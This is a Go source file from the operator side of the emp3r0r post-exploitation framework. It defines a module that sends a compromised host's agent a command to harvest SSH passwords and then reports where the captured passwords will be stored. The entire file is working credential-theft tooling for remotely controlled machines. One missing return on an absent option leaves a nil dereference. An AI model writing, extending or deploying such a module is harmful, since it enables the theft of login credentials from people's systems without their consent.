//go:build linux
// +build linux

package cc

import (
	"fmt"
	"strconv"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
)

func module_ssh_harvester() {
	if CurrentTarget == nil {
		LogError("CurrentTarget is nil")
		return
	}
	code_pattern_opt, ok := CurrentModuleOptions["code_pattern"]
	if !ok {
		LogError("code_pattern not specified")
		return
	}

	reg_name_opt, ok := CurrentModuleOptions["reg_name"]
	if !ok {
		LogError("reg_name not specified")
	}
	err := SendCmdToCurrentTarget(fmt.Sprintf("%s --code_pattern %s --reg_name %s",
		emp3r0r_def.C2CmdSSHHarvester, strconv.Quote(code_pattern_opt.Val), strconv.Quote(reg_name_opt.Val)), "")
	if err != nil {
		LogError("SendCmd: %v", err)
		return
	}
	LogMsg("Passwords will show up in the file path given by agent")
}
